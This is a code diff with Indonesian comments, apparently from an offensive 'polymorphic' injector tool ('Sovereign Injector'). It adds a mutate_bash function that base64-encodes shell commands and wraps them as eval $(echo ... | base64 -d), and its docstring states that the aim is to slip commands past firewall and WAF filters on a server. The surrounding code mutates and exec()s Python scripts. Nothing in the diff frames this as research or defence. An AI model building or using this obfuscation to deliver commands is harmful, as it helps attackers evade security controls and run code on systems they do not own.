@@ -62,6 +62,22 @@ exec({var_exec})
             log.error(f"[POLYMORPHIC] Mutasi gagal: {e}")
             return script_content # Fallback ke original jika gagal
 
+    @staticmethod
+    def mutate_bash(bash_cmd: str) -> str:
+        """
+        Memutasi perintah bash menjadi format terselubung (obfuscated).
+        Menggunakan Base64 encoding yang dievaluasi di sisi server (VPS)
+        agar lolos filter firewall/WAF.
+        """
+        try:
+            encoded_cmd = base64.b64encode(bash_cmd.encode('utf-8')).decode('utf-8')
+            # Contoh: eval $(echo "Y3VybCBnb29nbGUuY29t" | base64 -d)
+            mutated = f'eval $(echo "{encoded_cmd}" | base64 -d)'
+            return mutated
+        except Exception as e:
+            log.error(f"[POLYMORPHIC] Mutasi bash gagal: {e}")
+            return bash_cmd
+
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO)
     sample_code = "print('Sovereign Injector Active')"
